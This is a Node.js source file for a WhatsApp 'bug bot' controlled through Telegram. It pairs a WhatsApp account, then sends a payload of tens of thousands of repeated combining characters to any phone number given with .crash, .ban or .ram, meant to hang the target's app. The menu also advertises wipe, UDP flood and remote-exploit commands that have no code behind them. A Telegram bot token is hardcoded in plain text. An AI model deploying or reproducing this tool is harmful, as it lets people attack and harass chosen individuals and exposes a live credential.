const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    makeCacheableSignalKeyStore,
    Browsers
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Telegraf, Markup } = require('telegraf');

const TG_TOKEN = '8655630932:AAECvnRecMAmBX44Ms-Rsp0gUwWdkWn-L5o';
const bot = new Telegraf(TG_TOKEN);
const owner = "Sasiya ROOT";
const logo = 'https://i.ibb.co/LzgMB0pj/image.jpg';

let sock;

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_final_v25');
    
    sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: Browsers.macOS("Desktop")
    });

    sock.ev.on('creds.update', saveCreds);

    // --- [ TELEGRAM INTERFACE ] ---
    bot.start((ctx) => {
        ctx.replyWithPhoto(logo, {
            caption: `🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐕𝟐𝟓** ϟ 🧬\n━━━━━━━━━━━━━━━━━━━━\n👤 **OPERATOR:** ${owner}\n🚀 **MODE:** HYBRID INJECTOR\n━━━━━━━━━━━━━━━━━━━━\n1. Use the button to Link WA.\n2. Use **.menu** in WhatsApp to start.`,
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([[Markup.button.callback('🔗 GET PAIRING CODE', 'get_code')]])
        });
    });

    bot.action('get_code', (ctx) => {
        ctx.reply("📱 **ENTER NUMBER (947xxxxxxxx):**");
        bot.on('text', async (numCtx) => {
            let num = numCtx.message.text.replace(/[^0-9]/g, '');
            try {
                await delay(8000); 
                let code = await sock.requestPairingCode(num);
                numCtx.reply(`🔐 **YOUR CODE:** \`${code}\``);
            } catch (e) { numCtx.reply("❌ **ERROR:** Try again in 10s."); }
        });
    });

    // --- [ WHATSAPP BUG MENU SYSTEM ] ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        const msg = chatUpdate.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const mText = (msg.message.conversation || msg.message.extendedTextMessage?.text || "").toLowerCase();
        const from = msg.key.remoteJid;

        // --- [.MENU COMMAND] ---
        if (mText === '.menu') {
            const menuText = `
🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟓** ϟ 🧬
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 **OPERATOR:** ${owner}
🛡️ **STATUS:** SYSTEM ONLINE 🟢
━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **SELECT A LETHAL COMMAND:**

🚫 **.ban [number]** - Permanent Ban
🔥 **.crash [number]** - Extreme Hang
📂 **.wipe [number]** - DB Destroyer
⚡ **.ram [number]** - RAM Killer
🧬 **.bin [number]** - Binary Flood
🛡️ **.bypass [number]** - WAF Bypass
📡 **.udp [number]** - Packet Flood
🧪 **.rce [number]** - Remote Exploit
⚠️ **.flag [number]** - Security Flag

━━━━━━━━━━━━━━━━━━━━━━━━━━
*Type any command above to inject!*
    *POWERED BY: DEVELOPER NEXUS*
━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
            await sock.sendMessage(from, { text: menuText });
        }

        // --- [BUG EXECUTION LOGIC] ---
        if (mText.startsWith('.crash') || mText.startsWith('.ban') || mText.startsWith('.ram')) {
            const target = mText.split(" ")[1];
            if (!target) return sock.sendMessage(from, { text: "❌ **ERROR:** Please provide a number!" });
            
            const targetId = target.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            await sock.sendMessage(from, { text: "🛠️ **INJECTING POWERFUL PAYLOAD...**" });
            
            // Extreme Crash String
            const bugPayload = "ॣ".repeat(55000) + "ꦾ".repeat(15000);

            try {
                await sock.sendMessage(targetId, { text: bugPayload });
                await sock.sendMessage(from, { text: `✅ **SUCCESS:** Bug injected to ${target}!` });
            } catch (err) {
                await sock.sendMessage(from, { text: "❌ **FAILED:** Could not reach target." });
            }
        }
    });

    bot.launch();
}

startNexus();
